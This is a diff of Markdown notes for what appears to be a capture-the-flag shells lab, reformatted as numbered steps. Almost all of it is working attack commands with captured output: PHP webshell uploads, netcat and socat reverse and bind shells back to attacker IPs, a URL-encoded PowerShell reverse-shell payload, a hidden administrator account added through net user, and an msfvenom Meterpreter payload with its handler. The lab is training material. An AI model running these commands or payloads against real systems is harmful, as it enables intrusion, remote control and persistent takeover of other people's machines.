@@ -579,132 +579,313 @@ net localgroup administrators <username> /add
 * Always want to escalate into using a 'normal' method for accessing the machine as this will invariably be easier to use for further exploitation of the target.
 
 ## Practice and Examples
-* Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.
-* Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your attacking machine’s IP with a custom port. Set up a netcat listener, then upload and activate the shell.
-* Make a copy of the supplied webshell on the attacking machine’s Desktop:
-* cp  /usr/share/webshells/php/php-reverse-shell.php ./Desktop
-* Edit the webshell:
-* vim ./Desktop/php-reverse-shell.php
-* Press ‘i’ to enter insert mode
-* Change ip to 10.10.52.172
-* Press ‘Escape’ to enter Command mode
-* Press ‘:wq’ to save changes and exit file
-* Setup NetCat listener on attack machine:
-* nc -lvnp 1234
-* Upload webshell to target:
-* Browse to http://10.10.62.10 from attacking machine
-* Click ‘Browse’ button
-* Navigate to /root/Desktop/php-reverse-shell.php
-* Click ‘Open’ to select the file
-* Click ‘Submit’ to upload the file
-* Execute webshell on target by amending URL:
-* http://10.10.62.10/uploads/php-reverse-shell.php?cmd=nc 10.10.52.172 1234 -e /bin/bash
-* Reverse shell creates session back to listener:
+> Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on the attaching machine.
+1. Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali.
+   * Make a copy of the supplied webshell on the attacking machine’s Desktop.
+```
+cp  /usr/share/webshells/php/php-reverse-shell.php ./Desktop
+```
+3. Change the IP and port of the webshell to match the attacking machine’s IP with a custom port.
+   * `vim ./Desktop/php-reverse-shell.php`.
+   * Press `i` to enter insert mode.
+   * Change ip to 10.10.52.172.
+   * Press `Escape` to enter Command mode.
+   * Press `:wq` to save changes and exit file.
+5. Set up a netcat listener on the attack machine.
+```
+nc -lvnp 1234
+```
+7. Upload webshell to target.
+   * Browse to `http://10.10.62.10` from attacking machine.
+   * Click ‘Browse’ button.
+   * Navigate to `/root/Desktop/php-reverse-shell.php`.
+   * Click ‘Open’ to select the file.
+   * Click ‘Submit’ to upload the file.
+9. Execute webshell on target
+   * Amend URL to `http://10.10.62.10/uploads/php-reverse-shell.php?cmd=nc 10.10.52.172 1234 -e /bin/bash`
+   * Reverse shell creates session back to listener
+```
+Connection from 10.10.62.10 34914 received!
+Linux linux-shell-practice 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 20:28:01 up 10 min, 0 users, load average: 0.00, 0.20, 0.25
+USER     TTY      FROM           LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0 can't access tty: job control turned off
+```
 
-### Extra: stabilise the netcat:
+### Extra: stabilise the netcat.
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-
 export TERM=xterm
-
-Background the shell using Ctrl+Z
-. 
+```
+* Background the shell using `Ctrl+Z`
+``` 
 stty raw -echo; fg
 ```
-* Log into the Linux machine over SSH using the supplied credentials.
-* Use the techniques in the Common Shell Payloads section to experiment with bind and reverse netcat shells.
-* SSH onto the target machine:
-* ssh shell@10.10.62.10
-* Create a reverse shell and execute the bash process upon connection:
-* On target machine: nc 10.10.52.172 1234 -e /bin/bash
-* Create listener on attacker’s terminal: nc -lvnp 1234
-* Create a bind shell and execute the bash process upon connection:
-* On target machine create a listener: nc -lvnp 1234 -e /bin/bash
-* Connect to listener from attack machine: nc 10.10.62.10 1234
-* Create named pipe for bind shell:
-* Create listener on target’s terminal: mkfifo /tmp/f; nc -lvnp 1234 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
-* This creates a named pipe at /tmp/f, stats a nc listener, directs the listener’s input (sent commands) into the output of the named pipe, pipes this to bin/sh, and removes the pipe at the end
-* Connect NetCat to listener on attacker’s terminal: nc 10.10.19.211 1234
-* Bind shell connected to named pipe method:
-* Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.
-* Create reverse shell and execute the bash process upon connection:
-* Create reverse shell on target’s terminal to connect to listener: socat TCP:10.10.52.172:1234 EXEC:”bash -li”
-* Create listener on attacker’s terminal: socat TCP-L:1234 -
-* Reverse shell connects to listener:
-* Create bind shell and execute the bash process upon connection:
-* Create listener on target’s terminal: socat TCP-L:12345 EXEC:”bash -li”
-* Bind to listener from attacker’s terminal: socat TCP:10.10.62.10:12345 -
-* Bind shell connects to listener:
-* Create fully stable reverse shell using socat special technique:
-* Create listener on attacter’s terminal: socat TCP-L:1234 FILE:`tty`,raw,echo=0
-* Create tty reverse shell on target’s terminal: socat TCP:10.10.108.143:1234 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane
-* Fully interactive session is created on attacker’s terminal
-* Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.
-* Create new php file in attacker’s terminal:
-* cat > /root/Desktop/windows-php-reverse-shell.php
-* Add text to file: <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
-* CTRL+C to write changes to file
-* Upload webshell to target:
-* Browse to http://10.10.122.18 from attacker
-* Click ‘Browse’ button
-* Navigate to /root/Desktop/windows-php-reverse-shell.php
-* Click ‘Open’ to select the file
-* Click ‘Submit’ to upload the file
-* Create listener in attacker’s terminal: nc -lvnp 1234
-* Verify that webshell GET parameter (‘cmd’) is working by passing ‘ipconfig’ command in attacker’s browser: http://10.10.122.18/uploads/windows-php-reverse-shell.php?cmd=ipconfig
-* Execute Powershell in attacker’s browser by copying powershell into the URL as the cmd argument:
+> Log into the Linux machine over SSH using the supplied credentials. Use the techniques in the Common Shell Payloads section to experiment with bind and reverse netcat shells.
+1. Create reverse shell on target and execute the bash process upon connection.
+```
+nc 10.10.52.172 1234 -e /bin/bash
+```
+ 2. Create listener on attacking machine.
+```
+nc -lvnp 1234
+
+Listening on [0.0.0.0] (family 0, port 1234)
+```
+ 3. Connection received by attacker.
+```
+Connection from 10.10.62.10 34924 received!
+pwd
+/home/shell
+```
+4. Create bind shell and execute the bash process upon connection.
+   * Create listener on target.
+```
+nc -lvnp 1234 -e /bin/bash
+
+listening on [any] 1234 ...
+```
+ 5. Connect to listener from attacking machine.
+```
+nc 10.10.62.10 1234
+```
+ 6. Connection established.
+   * On target.
+```
+connect to [10.10.62.10] from (UNKNOWN) [10.10.52.172] 50168
+```
+  * On attacker.
+```
+pwd
+/home/shell
+```
+7. Create named pipe for bind shell.
+ 8. Create listener on target.
+```
+mkfifo /tmp/f; nc -lvnp 1234 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
+
+listening on [any] 1234 ...
+```
+ 9. Connect NetCat to listener.
+```
+nc 10.10.19.211 1234
+```
+ 10. Bind shell connected to named pipe method.
+   * On target.
+```
+connect to [10.10.19.211] from (UNKNOWN} [10.10.145.37] 60982
+```
+   * On attacker.
+```
+whoami
+shell
+pwd
+/home/shell
+```
+> Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.
+1. Create reverse shell and execute the bash process upon connection.
+ 2. Create reverse shell on target.
+```
+socat TCP:10.10.52.172:1234 EXEC:”bash -li”
+```
+ 3. Create listener on attacker.
+```
+socat TCP-L:1234 -
+```
+ 4. Reverse shell caught by listener.
+```
+pwd
+/home/shell
+```
+5. Create bind shell and execute the bash process upon connection.
+ 6. Create listener on target.
+```
+socat TCP-L:12345 EXEC:”bash -li”
+```
+ 7. Bind to listener from attacker.
+```
+socat TCP:10.10.62.10:12345 -
+```
+ 8. Bind shell caught by listener.
+```
+pwd
+/home/shell
+```
+9. Create fully stable reverse shell using socat special technique.
+ 10. Create listener on attacker.
+```
+socat TCP-L:1234 FILE:`tty`,raw,echo=0
+```
+ 11. Create tty reverse shell on target.
+```
+socat TCP:10.10.108.143:1234 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane
+```
+ 12. Fully interactive session created.
+```
+shell@linux-shell-practice:~$ pwd
+/home/shell
+shell@linux-shell-practice:~$ whoami
+shell
+```
+> Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.
+ 14. Create new php file in attacker’s terminal.
+```
+cat > /root/Desktop/windows-php-reverse-shell.php
+```
+ 15. Add text to file.
+```
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
+ 16. `CTRL+C` to write changes to file.
+ 17. Upload webshell to target.
+     * Browse to http://10.10.122.18 from attacker.
+     * Click ‘Browse’ button.
+     * Navigate to `/root/Desktop/windows-php-reverse-shell.php`.
+     * Click ‘Open’ to select the file.
+     * Click ‘Submit’ to upload the file.
+ 18. Create listener in attacker’s terminal.
+```
+nc -lvnp 1234
+```
+ 19. Verify that webshell GET parameter (`cmd`) is working by passing `ipconfig` command in attacker’s browser.
+```
+http://10.10.122.18/uploads/windows-php-reverse-shell.php?cmd=ipconfig
+```
+ 20. Execute Powershell in attacker’s browser by copying powershell into the URL as the `cmd` argument.
+```
 http://10.10.122.18/uploads/windows-php-reverse-shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.108.143%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
-* Amend the <IP> to the attacker’s IP address and the <port> to 1234
-* Connection from target received:
-* The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.
-* Create a new user:
-* In the reverse shell session created in the previous task: net user /add newadmin password
-* Add the new user to the Administrators group:
-* net localgroup administrators newadmin /add
-* Login over RDP using new user account:
-* On the attacker’s terminal: xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.70.179 /u:newadmin /p:'password'
-* RDP connects after acknowledging certificate CN mismatch:
-* Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.
-* Create Netcat reverse shell
-* Start listener in attacker’s terminal: nc -lvnp 1234
-* Create RDP session using supplied administrative credentials: xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.70.179 /u:Administrator /p:'TryH4ckM3!'
-* Open command prompt on target and create bind shell: nc 10.10.248.19 1234 -e “powershell.exe”
-* Connection established:
-* Create Netcat bind shell (using existing RDP session):
-* Open command prompt on target and create listener: nc -lvnp 1234 -e “powershell.exe”
-* Create an outbound connection from the attacker’s terminal: nc 10.10.70.179 1234
-* Session is established:
-* Create a socal reverse shell (using existing RDP session):
-* Start listener in attacker’s terminal: socat TCP-L:1234 -
-* Open command prompt and create connection back to listener: socat TCP:10.10.18.162:1234 EXEC:powershell.exe,pipes
-* Session established:
-* Create a socat bind shell (using existing RDP session):
-* Create listener at command prompt of target: socat TCP-L:1234 EXEC:powershell.exe,pipes
-* Connect to waiting listener from attacker’s terminal: socat TCP:10.10.70.179:1234 -
-* Session established:
-* Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.
-* Create msfvenom payload:
-* msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.248.19 LPORT=1234
-* Upload shell.exe to the target
-* Browse to http://10.10.70.179 in attacker’s browser
-* Click ‘Browse’ button
-* Navigate to /root/shell.exe
-* Click ‘Open’ to select the file
-* Click ‘Submit’ to upload the file
-* Create a Meterpreter listener to catch the reverse shell:
-* Msfconsole
-* use multi/handler
-* set LHOST 10.10.248.19
-* set LPORT 1234
-* set PAYLOAD windows/x64/meterpreter/reverse_tcp
-* run
-* Execute the shell
-* RDP to the target
-* Open a browser on the target
-* Browse to http://127.0.0.1/uploads
-* Save the shell.exe file
-* Run file
-* Meterpreter session is created:
+```
+    * Amend <IP> to the attacker’s IP address and <port> to 1234.
+ 21. Connection from target received.
+```
+connection from 10.10.70.179 49827 received!
+whoami
+nt authority\system
+PS C:\xampp\htdocs\uploads> pwd
+
+Path
+----
+C:\xampp\htdocs\uploads
+```
+> Webserver is running with SYSTEM privileges. Create a new user and add it to the 'administrators' group, then login over RDP or WinRM.
+ 23. Create a new user in the reverse shell session created in the previous task.
+```
+net user /add newadmin password
+```
+ 24. Add the new user to the Administrators group.
+```
+net localgroup administrators newadmin /add
+```
+ 25. Login over RDP using new user account.
+```
+xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.70.179 /u:newadmin /p:'password'
+```
+    * RDP connects after acknowledging certificate CN mismatch.
+> Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.
+26. Create Netcat reverse shell.
+ 27. Start listener on attacker.
+```
+nc -lvnp 1234
+```
+ 28. Create RDP session using supplied administrative credentials.
+```
+xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.70.179 /u:Administrator /p:'TryH4ckM3!'
+```
+ 29. Open command prompt on target and create bind shell.
+```
+nc 10.10.248.19 1234 -e “powershell.exe”
+```
+ 30. Connection established.
+```
+Connection from 10.10.70.179 50558 received!
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator>
+```
+31. Create Netcat bind shell (using existing RDP session).
+ 32. Open command prompt on target and create listener.
+```
+nc -lvnp 1234 -e “powershell.exe”
+```
+ 33. Create outbound connection from attacker.
+```
+nc 10.10.70.179 1234
+```
+ 34. Session is established.
+    * On target:
+```
+connect to [10.10.70.179] from (UNKNOWN) [10.10.18.162] 50900
+```
+   * On attacker.
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator>
+```
+35. Create a socal reverse shell (using existing RDP session).
+ 36. Start listener in attacker.
+```
+socat TCP-L:1234 -
+```
+ 37. Open command prompt on target and create connection back to listener.
+```
+socat TCP:10.10.18.162:1234 EXEC:powershell.exe,pipes
+```
+ 38. Session established.
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator>
+```
+39. Create a socat bind shell (using existing RDP session).
+ 40. Create listener at command prompt of target.
+```
+socat TCP-L:1234 EXEC:powershell.exe,pipes
+```
+ 41. Connect to waiting listener from attacker.
+```
+socat TCP:10.10.70.179:1234 -
+```
+ 42. Session established.
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator>
+```
+> Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.
+1. Create msfvenom payload.
+```
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.248.19 LPORT=1234
+```
+2. Upload shell.exe to the target.
+ 1. Browse to http://10.10.70.179 in attacker’s browser.
+ 2. Click ‘Browse’ button.
+ 3. Navigate to /root/shell.exe.
+ 4. Click ‘Open’ to select the file.
+ 5. Click ‘Submit’ to upload the file.
+3. Create Meterpreter listener to catch the reverse shell.
+ 1. `Msfconsole`
+ 2. `use multi/handler`
+ 3. `set LHOST 10.10.248.19`
+ 4. `set LPORT 1234`
+ 5. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
+ 6. `run`
+4. Execute the shell.
+ 1. RDP to target.
+ 2. Open browser on the target.
+ 3. Browse to `http://127.0.0.1/uploads`.
+ 4. Save the `shell.exe` file.
+ 5. Run file
+5. Meterpreter session is created on attacker.
+```
+[+] Sending stage (200774 bytes) to 10.10.70.179
+[+] Meterpreter session 1 opened (10.10.248.19:1234 -> 10.10.70.179:50335) at 2024-01-11 17:35:22 +0000
+```
 * Create both staged and stageless meterpreter shells for either target.
 * Upload and manually activate them, catching the shell with netcat -- does this work?
 * Create stageless meterpreter shell for Windows target:
